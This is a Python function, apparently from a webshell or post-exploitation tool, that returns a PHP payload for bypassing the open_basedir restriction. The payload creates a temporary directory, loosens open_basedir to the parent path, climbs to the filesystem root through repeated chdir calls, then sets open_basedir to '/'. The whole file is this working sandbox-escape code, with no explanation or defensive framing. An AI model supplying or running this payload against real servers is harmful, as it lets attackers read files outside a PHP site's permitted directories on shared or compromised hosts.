
def get_php_bp_obd():
    return """
        $dir=pos(glob("./*", GLOB_ONLYDIR));
        $cwd=getcwd();
        $ndir="./%s";
        if($dir === false){
        $r=mkdir($ndir);
        if($r === true){$dir=$ndir;}}
        chdir($dir);
        if(function_exists("ini_set")){
            ini_set("open_basedir","..");
        } else {
            ini_alter("open_basedir","..");
        }
        $c=substr_count(getcwd(), "/");
        for($i=0;$i<$c;$i++) chdir("..");
        ini_set("open_basedir", "/");
        chdir($cwd);rmdir($ndir);
     """
